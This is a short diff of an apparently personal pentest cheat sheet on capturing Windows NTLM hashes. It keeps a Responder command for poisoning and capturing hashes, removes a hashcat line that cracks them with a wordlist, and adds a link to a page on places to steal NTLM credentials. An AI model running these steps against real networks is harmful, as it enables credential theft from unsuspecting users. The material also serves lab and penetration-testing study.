@@ -11,7 +11,8 @@ Command=ToggleDesktop
 
 # use responder to capture hash
 sudo responder -wrf --lm -v -I tun0
-
-# crack: copy entire responder hash in file
-hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
 ```
+
+## More Ways
+
+* [https://book.hacktricks.xyz/windows/ntlm/places-to-steal-ntlm-creds](https://book.hacktricks.xyz/windows/ntlm/places-to-steal-ntlm-creds)
